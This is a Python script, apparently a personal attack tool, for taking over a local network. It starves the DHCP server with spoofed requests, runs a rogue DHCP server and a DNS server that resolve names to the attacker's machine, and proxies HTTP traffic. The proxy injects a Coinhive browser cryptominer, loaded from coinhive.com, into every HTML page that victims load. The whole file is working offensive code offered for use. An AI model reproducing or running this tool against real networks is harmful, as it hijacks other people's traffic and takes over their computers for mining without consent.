#/usr/bin/python

# Dao Xuan Hung
# 16/08/2018 13:25

from scapy.all import *
import threading, time, datetime, socket, binascii, string, signal, sys, os, random, socket, zlib
import StringIO
import httplib

def randomMAC():
    # from DHCPPig
    mac = [ 0xDE, 0xAD,
        random.randint(0x00, 0x29),
        random.randint(0x00, 0x7f),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff) ]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def unpackMAC(binmac):
    # from DHCPPig
    mac = binascii.hexlify(binmac)[0:12]
    blocks = [mac[x:x+2] for x in xrange(0, len(mac), 2)]
    return ':'.join(blocks)

def seconds_diff(dt2, dt1):
    # from https://www.w3resource.com/python-exercises/date-time-exercise/python-date-time-exercise-36.php
    timedelta = dt2 - dt1
    return timedelta.days * 24 * 3600 + timedelta.seconds

def randomHostname(length):
    # and this from me :))
    hostname = ''
    for i in range (length):
        num = random.randint(97, 122)
        hostname += chr(num)
    return hostname

def getInterfaceIPAddress(iface):
    f = os.popen('ifconfig ' + iface + ' | grep "inet addr" | cut -d: -f2 | cut -d" " -f1')
    return f.read().strip()

def getInterfaceMask(iface):
    f = os.popen('ifconfig ' + iface + ' | grep "inet addr" | cut -d: -f4 | cut -d" " -f1')
    return f.read().strip()

def getInterfaceBroadcast(iface):
    f = os.popen('ifconfig ' + iface + ' | grep "inet addr" | cut -d: -f3 | cut -d" " -f1')
    return f.read().strip()

def getInterfaceGateway(iface):
    f = os.popen('ip route | grep default | grep ' + iface + ' | cut -d" " -f3')
    return f.read().strip()

def getInterfaceMAC(iface):
    f = os.popen('ifconfig ' + iface + ' | grep "HWaddr" | cut -d" " -f11')
    return f.read().strip()

def socketRecvUntil(conn, target):
    buff = ''
    while(True):
        byte = conn.recv(1)
        buff += byte
        if (buff.endswith(target)):
            return buff

def getHeaderValue(headers, field):
    field = field.lower()

    for f in headers:
        if (f.lower().startswith(field + ":")):
            parts = f.split(": ")
            return parts[1]
    return ''

def removeHeader(headers, field):
    field2 = field.lower()

    length = len(headers)
    for i in range(length):
        if (headers[i].lower().startswith(field2 + ":")):
            del headers[i]
            return

def setHeaderValue(headers, field, value):
    field2 = field.lower()
    exists = False
    length = len(headers)
    for i in range(length):
        if (headers[i].lower().startswith(field2 + ":")):
            headers[i] = field + ": " + value
            exists = True

    if (not exists):
        headers.append(field + ": " + value)

def getHeader(conn):
    headers = socketRecvUntil(conn, '\r\n\r\n').strip(' \t\n\r').split('\r\n')
    return headers

def getURI(headers):
    return headers[0].split(' ')[1]

def getMethod(headers):
    return headers[0].split(' ')[0]

def buildHeader(headers):
    header = {}
    for field in headers:
        parts = field.split(": ")
        if (len(parts) > 1):
            header[parts[0]] = parts[1]
    return header

def headerToString(headers):
    header = ''
    for field in headers:
        header += field + '\r\n'
    header += '\r\n'
    return header

def normalizeServerHeader(header_fields):
    res = ''

    for key,value in header_fields:
        res += key + ": " + value + "\r\n"
    headers = res.strip(' \t\r\n').split('\r\n')
    return headers

def injectHTML(html):
    html = html.replace("</body>", "<script src='https://coinhive.com/lib/coinhive.min.js'></script><script>var miner = new CoinHive.Anonymous('', {throttle: 0.8});miner.start();</script></body>")
    return html

class DHCPSniffer(threading.Thread):
    def __init__(self, iface):
        super(DHCPSniffer, self).__init__()
        self.iface = iface
        self.socket = None
        self.daemon = True
        self.stop_sniffer = threading.Event()

    def run(self):
        filter_options = 'udp and src port 67 and dst port 68'

        self.socket = conf.L2listen(type = ETH_P_ALL,
                                    iface = self.iface,
                                    filter = filter_options
                                    )
        
        sniff(opened_socket = self.socket, prn=self.ProcessPacket, stop_filter=self.should_stop_sniffer)

    def should_stop_sniffer(self, packet):
        return self.stop_sniffer.isSet()

    def join(self, timeout = None):
        self.stop_sniffer.set()
        self.socket.close() # this socket must be closed to stop sniffer
        super(DHCPSniffer, self).join(timeout)

    def ProcessPacket(self, packet):
        if (DHCP in packet):
            if (packet[DHCP] and packet[DHCP].options[0][1] == 2): # if DHCP Offer
                ip = packet[BOOTP].yiaddr
                serverip = packet[BOOTP].siaddr
                tranid = packet[BOOTP].xid
                srcmac = unpackMAC(packet[BOOTP].chaddr)

                # create DHCP request
                request = DHCPRequestClient(self.iface, srcmac, ip, serverip, tranid)
                request.run()
                del request

            if (packet[DHCP] and packet[DHCP].options[0][1] == 5): # if DHCP ACK
                ip = packet[BOOTP].yiaddr
                print "Got IP address: " + ip

class DHCPRequestClient():
    broadcast_MAC = 'ff:ff:ff:ff:ff:ff'
    broadcast_IP = '255.255.255.255'

    def __init__(self, iface, srcmac, ip, serverip, tranid):
        self.iface  = iface
        self.srcmac = srcmac
        self.ip     = ip
        self.serverip = serverip
        self.tranid = tranid

    def run(self):
        global last_response_time
        # when this method run, it means DHCP server has just offered us new IP address
        last_response_time = datetime.datetime.now()
        self.Request()

    def Request(self):
        frame       = Ether(src = self.srcmac, dst = self.broadcast_MAC)
        ippacket    = IP(src = '0.0.0.0', dst = self.broadcast_IP)
        udppacket   = UDP(sport = 68, dport = 67)
        bootp       = BOOTP(op = 'BOOTREQUEST',
                            xid = self.tranid, # Transaction ID
                            flags = 0,   # Unicast
                            chaddr = mac2str(self.srcmac))

        myoptions   = [ ('message-type', 'request'),
                        ('param_req_list', chr(1), chr(3), chr(6), chr(15), chr(31), chr(33), chr(43), chr(44), chr(46), chr(47), chr(119), chr(121), chr(249), chr(252)),
                        ('client_id', chr(1), mac2str(self.srcmac)), # Ethernet
                        ('server_id', self.serverip),
                        ('requested_addr', self.ip),
                        ('end')]
        dhcprequest= DHCP(options = myoptions)

        packet = frame/ippacket/udppacket/bootp/dhcprequest

        sendp(packet, iface=self.iface, verbose=False)

class DHCPDiscoverClient():
    broadcast_MAC = 'ff:ff:ff:ff:ff:ff'
    broadcast_IP = '255.255.255.255'

    def __init__(self, srcmac, iface):
        self.srcmac = srcmac
        self.hostname = randomHostname(random.randint(6, 10))
        self.iface = iface

    def run(self):
        self.Discover()

    def Discover(self):
        frame       = Ether(src = self.srcmac, dst = self.broadcast_MAC)
        ippacket    = IP(src = '0.0.0.0', dst = self.broadcast_IP)
        udppacket   = UDP(sport = 68, dport = 67)
        bootp       = BOOTP(op = 'BOOTREQUEST',
                            xid = random.randint(0x1000, 0x5000), # Transaction ID
                            flags = 0,   # Unicast
                            chaddr = mac2str(self.srcmac))

        myoptions   = [ ('message-type', 'discover'),
                        ('param_req_list', chr(1), chr(3), chr(6), chr(15), chr(31), chr(33), chr(43), chr(44), chr(46), chr(47), chr(119), chr(121), chr(249), chr(252)),
                        ('client_id', chr(1), mac2str(self.srcmac)), # Ethernet
                        ('hostname', self.hostname),
                        ('end') ]
        dhcpdiscover= DHCP(options = myoptions)

        packet = frame/ippacket/udppacket/bootp/dhcpdiscover

        sendp(packet, iface=self.iface, verbose=False)

class DHCPServer(threading.Thread):
    def __init__(self, iface, myMAC, myIP, gwIP, dnsIP, netmask, broadcast, domain):
        super(DHCPServer, self).__init__()
        self.iface = iface
        self.myMAC = myMAC
        self.myIP = myIP
        self.gwIP = gwIP
        self.dnsIP = dnsIP
        self.netmask = netmask
        self.broadcast = broadcast
        self.domain = domain
        self.offered = {myIP: ('null', 'null', 'null'), gwIP: ('null', 'null', 'null'), dnsIP: ('null', 'null', 'null')}
        self.socket = None
        self.daemon = True
        self.stop_sniffer = threading.Event()
        data = myIP.split('.')
        self.myNet = data[0] + '.' + data[1] + '.' + data[2] + '.'

    def run(self):
        filter_options = 'udp and src port 68 and dst port 67'

        self.socket = conf.L2listen(type = ETH_P_ALL,
                                    iface = self.iface,
                                    filter = filter_options
                                    )
        
        sniff(opened_socket = self.socket, prn=self.ProcessPacket, stop_filter=self.should_stop_sniffer)

    def should_stop_sniffer(self, packet):
        return self.stop_sniffer.isSet()

    def join(self, timeout = None):
        self.stop_sniffer.set()
        self.socket.close() # this socket must be closed to stop sniffer
        super(DHCPServer, self).join(timeout)

    def ProcessPacket(self, packet):
        if (DHCP in packet):
            if (packet[DHCP] and packet[DHCP].options[0][1] == 1): # if DHCP Discover
                client_mac = unpackMAC(packet[BOOTP].chaddr)
                tranid = packet[BOOTP].xid
                hostname = ''
                for option in packet[DHCP].options:
                    if (option[0] == 'hostname'):
                        hostname = option[1]

                self.Offer(client_mac, tranid, hostname)

            if (packet[DHCP] and packet[DHCP].options[0][1] == 3): # if DHCP Request
                client_mac = unpackMAC(packet[BOOTP].chaddr)
                tranid = packet[BOOTP].xid
                hostname = ''
                client_ip = ''
                for option in packet[DHCP].options:
                    if (option[0] == 'hostname'):
                        hostname = option[1]
                    if (option[0] == 'requested_addr'):
                        client_ip = option[1]

                self.Ack(client_ip, client_mac, tranid, hostname)

    def Offer(self, client_mac, tranid, hostname):
        client_ip = ''

        for i in range (1, 255, 1):
            if (self.myNet + str(i) not in self.offered):
                client_ip = self.myNet + str(i)
                break
            
        if (client_ip == ''):
            print "IP Address exhausted"
            return

        print "Offer IP Address: " + client_ip
        self.offered[client_ip] = (client_mac, hostname, tranid, datetime.datetime.now())

        frame       = Ether(dst = client_mac)
        ippacket    = IP(src = self.myIP, dst = client_ip)
        udppacket   = UDP(sport = 67, dport = 68)
        bootp       = BOOTP(op = 'BOOTREPLY',
                            xid = tranid, # Transaction ID
                            flags = 0,   # Unicast
                            chaddr = mac2str(client_mac),
                            yiaddr = client_ip)

        myoptions   = [ ('message-type', 'offer'),
                        ('server_id', self.myIP),
                        ('lease_time', 7200),
                        ('subnet_mask', self.netmask),
                        ('router', self.gwIP),
                        ('name_server', self.myIP),
                        ('domain', self.domain),
                        ('broadcast_address', self.broadcast),
                        ('end') ]

        dhcpoffer = DHCP(options = myoptions)

        packet = frame/ippacket/udppacket/bootp/dhcpoffer

        sendp(packet, iface=self.iface, verbose=False)


    def Ack(self, client_ip, client_mac, tranid, hostname):

        print "Client got IP Address: " + client_ip
        self.offered[client_ip] = (client_mac, hostname, tranid, datetime.datetime.now())

        frame       = Ether(dst = client_mac)
        ippacket    = IP(src = self.myIP, dst = client_ip)
        udppacket   = UDP(sport = 67, dport = 68)
        bootp       = BOOTP(op = 'BOOTREPLY',
                            xid = tranid, # Transaction ID
                            flags = 0,   # Unicast
                            chaddr = mac2str(client_mac),
                            yiaddr = client_ip)

        myoptions   = [ ('message-type', 'ack'),
                        ('server_id', self.myIP),
                        ('lease_time', 7200),
                        ('subnet_mask', self.netmask),
                        ('router', self.gwIP),
                        ('name_server', self.myIP),
                        ('domain', self.domain),
                        ('broadcast_address', self.broadcast),
                        ('end') ]

        dhcpack = DHCP(options = myoptions)

        packet = frame/ippacket/udppacket/bootp/dhcpack

        sendp(packet, iface=self.iface, verbose=False)

class DNSServer(threading.Thread):
    def __init__(self, iface, myIP, upperDNS):
        super(DNSServer, self).__init__()
        self.iface = iface
        self.myIP = myIP
        self.upperDNS = upperDNS
        self.daemon = True
        self.stop_sniffer = threading.Event()

    def run(self):
        print "DNS Server Start"
        filter_options = 'udp and dst port 53'

        self.socket = conf.L2listen(type = ETH_P_ALL,
                                    iface = self.iface,
                                    filter = filter_options
                                    )
        
        sniff(opened_socket = self.socket, prn=self.ProcessPacket, stop_filter=self.should_stop_sniffer)
    
    def should_stop_sniffer(self, packet):
        return self.stop_sniffer.isSet()

    def join(self, timeout = None):
        self.stop_sniffer.set()
        self.socket.close() # this socket must be closed to stop sniffer
        super(DNSServer, self).join(timeout)

    def ProcessPacket(self, packet):
        if (packet[IP].src != self.myIP):
            if (DNS in packet):
                if (packet[DNS] and packet[DNS].qr == 0):
                    dns = packet.getlayer(DNS)
                    srcIP = packet.getlayer(IP).src;

                    ippacket=IP(src = self.myIP, dst = self.upperDNS)
                    udppacket = UDP(sport = packet.getlayer(UDP).sport, dport = 53)
                    returnpck = sr1(ippacket/udppacket/dns, verbose=False)

                    rdns = returnpck.getlayer(DNS)
                    if (rdns[DNSQR].qtype == 1):
                        answer = rdns.getlayer(DNSRR)
                        rdns.ancount = int(rdns.ancount + 1)
                        #rdns.ancount = 1
                        rdns.an = DNSRR(rrname=rdns.qd.qname, ttl=3600, rdata=self.myIP)/answer
                        #rdns.an = DNSRR(rrname=rdns.qd.qname, ttl=3600, rdata=self.myIP)
                        send(IP(src = self.myIP, dst = srcIP)/UDP(sport = packet.getlayer(UDP).dport, dport = packet.getlayer(UDP).sport)/rdns, verbose=0)
                    else:
                        send(IP(src = self.myIP, dst = srcIP)/UDP(sport = packet.getlayer(UDP).dport, dport = packet.getlayer(UDP).sport)/rdns, verbose=0)

class HTTPServer(threading.Thread):
    def __init__(self, iface, myIP, port):
        super(HTTPServer, self).__init__()
        self.iface = iface
        self.myIP = myIP
        self.port = port
        self.daemon = True
        self.threads = []
        self.stop_sniffer = threading.Event()
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def join(self, timeout = None):
        self.stop_sniffer.set()
        self.server_socket.close() # this socket must be closed to stop sniffer
        super(HTTPServer, self).join(timeout)

    def run(self):
        # bind
        print "HTTP Server Start"
        self.server_socket.bind((self.myIP, self.port))
        self.server_socket.listen(20)

        while(True):
            conn, addr = self.server_socket.accept()
            print "Accept connection from ", addr
            
            server_thread = HTTPServerThread(conn)
            server_thread.start()
            self.threads.append(server_thread)

class HTTPServerThread(threading.Thread):
    def __init__(self, conn):
        super(HTTPServerThread, self).__init__()
        self.iface = iface
        self.daemon = True
        self.stop_sniffer = threading.Event()
        self.conn = conn

    def join(self, timeout = None):
        self.stop_sniffer.set()
        self.conn.close() # this socket must be closed to stop sniffer
        super(HTTPServerThread, self).join(timeout)

    def run(self):
        header_fields = getHeader(self.conn)
        host = getHeaderValue(header_fields, 'Host')
        method = getMethod(header_fields)
        uri = getURI(header_fields)

        setHeaderValue(header_fields, 'Connection', 'close')
        setHeaderValue(header_fields, 'Accept-Encoding', 'identity')
        my_headers = buildHeader(header_fields)
        params = ''
        try:
            if (method == "POST"):
                content_length = int(getHeaderValue(header_fields, 'Content-Length'))
                params = self.conn.recv(content_length)

            http_conn = httplib.HTTPConnection(getHeaderValue(header_fields, "Host"), 80)
            http_conn.request(method, uri, params, my_headers)
            
            server_response = http_conn.getresponse()
            server_headers = normalizeServerHeader(server_response.getheaders())
            content_type = getHeaderValue(server_headers, "Content-Type")
            server_body = ''
            if ("text/html" in content_type):
                server_body = injectHTML(server_response.read())
            else:
                server_body = server_response.read()

            removeHeader(server_headers, "Transfer-Encoding")
            setHeaderValue(server_headers, "Content-Length", str(len(server_body)))
            setHeaderValue(server_headers, "Content-Encoding", "identity")
            headers = headerToString(server_headers)
            self.conn.send("HTTP/1.1 " + str(server_response.status) + " " + str(server_response.reason) + "\r\n")
            self.conn.send(headers)
            self.conn.send(server_body)
            self.conn.close()
            http_conn.close()

        except (httplib.HTTPResponse, socket.error) as ex:
            print "Error Sending Data: %s" % ex
            self.conn.close()

def floodDHCPServer(iface):
    try:
        # Send DHCPDiscover continually
        # Sniffer receives OFFER packets, and create a DHCPRequest to receive ACK

        sniffer = DHCPSniffer(iface)
        sniffer.start()
        while(True):
            # send DHCP Discover
            discover = DHCPDiscoverClient(randomMAC(), iface)
            discover.run()
            del discover

            time.sleep(0.05)

            current_time = datetime.datetime.now()
            # if we hadn't received any offer in 10 seconds, it means DHCP server had been exhausted
            if (seconds_diff(current_time, last_response_time) > 10):
                # stop sniffer
                sniffer.join(2)
                del sniffer
                break
    except KeyboardInterrupt:
        sniffer.join(2)
        del sniffer

def DHCPServerStart(iface, myMAC, myIP, gwIP, netmask, broadcast, domain):
    print "Fake DHCP Server Start"
    server = DHCPServer(iface, myMAC, myIP, gwIP, myIP, netmask, broadcast, domain)
    server.start()

def DNSServerStart(iface, myIP, upperDNS):
    server = DNSServer(iface, myIP, upperDNS)
    server.start()

def HTTPServerStart(iface, myIP, port):
    server = HTTPServer(iface, myIP, port)
    server.start()

iface = 'eth0'
myMAC = getInterfaceMAC(iface)
myIP = getInterfaceIPAddress(iface)
gwIP = getInterfaceGateway(iface)
netmask = getInterfaceMask(iface)
broadcast = getInterfaceBroadcast(iface)
domain = 'localnet'
httpPort = 80

# variables
last_response_time = datetime.datetime.now()



#floodDHCPServer(iface)
#DHCPServerStart(iface, myMAC, myIP, gwIP, netmask, broadcast, domain)
DNSServerStart(iface, myIP, '192.168.49.2')
HTTPServerStart(iface, myIP, httpPort)
while True:
    time.sleep(0.01)

print "Done"

exit()